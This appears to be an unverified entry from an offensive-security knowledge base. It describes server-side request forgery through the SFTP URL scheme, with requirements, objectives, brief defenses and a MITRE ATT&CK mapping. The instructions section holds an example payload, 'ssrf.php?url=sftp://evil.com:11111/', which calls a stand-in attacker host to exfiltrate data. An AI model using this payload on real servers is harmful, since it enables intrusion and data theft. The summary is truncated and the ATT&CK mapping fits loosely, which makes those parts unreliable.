---
id: a62c81d3-3027-49be-9568-7004a69b2660
name: SSRF via SFTP URL Scheme
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:37.840176+00:00'
updated_at: '2023-04-10T20:24:02.418678+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[External Remote Services|T1133 - External Remote Services]]'
tags:
- '[[Server-Side Request Forgery]]'
- '[[SFTP]]'
- '[[SSRF exploitation via URL Scheme]]'
---

# SSRF via SFTP URL Scheme

## Summary

This procedure involves exploiting a Server-Side Request Forgery (SSRF) vulnerability in a web application that allows the attacker to send HTTP requests from the server-side to any destination specified by the attacker. In this case, the attacker uses an SFTP URL scheme to bypass network filters a

## Description

# Description

This procedure involves exploiting a Server-Side Request Forgery (SSRF) vulnerability in a web application that allows the attacker to send HTTP requests from the server-side to any destination specified by the attacker. In this case, the attacker uses an SFTP URL scheme to bypass network filters and exfiltrate data from the server. The attacker can use this technique to discover and collect sensitive data from the target environment.

To execute this procedure, the attacker needs to have access to the web application and identify a SSRF vulnerability that can be exploited via the SFTP URL scheme. The attacker also needs to have knowledge of the target network and identify a destination that can be used to exfiltrate data. 

Business value: An attacker can use this technique to exfiltrate sensitive data from a target environment without being detected by network filters. This can lead to loss of intellectual property, sensitive customer data, and financial loss.

 

## Requirements

1. Access to the web application with a SSRF vulnerability

1. Knowledge of the target network

1. Access to a destination that can be used to exfiltrate data

 

## Defense

1. Implement input validation and sanitization to prevent SSRF vulnerabilities

1. Use network filters and firewalls to restrict outbound traffic

1. Monitor network traffic for suspicious activity

 

## Objectives

1. Exfiltrate sensitive data from the target environment

1. Bypass network filters and restrictions

 

# Instructions

1. To use this command, simply replace the URL parameter with the desired target address. This command can be used to perform server-side request forgery attacks over SFTP.

 



**Code**: [[ssrf.php?url=sftp://evil.com:11111/]]



> The URL parameter in this command specifies the address of the target server. By manipulating this parameter, an attacker can force the server to perform unintended actions or disclose sensitive information. In this case, the command is used to perform a server-side request forgery attack over SFTP, which can allow an attacker to access internal resources or perform other malicious actions.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[External Remote Services|T1133 - External Remote Services]]

## Tags

- [[Server-Side Request Forgery]]
- [[SFTP]]
- [[SSRF exploitation via URL Scheme]]


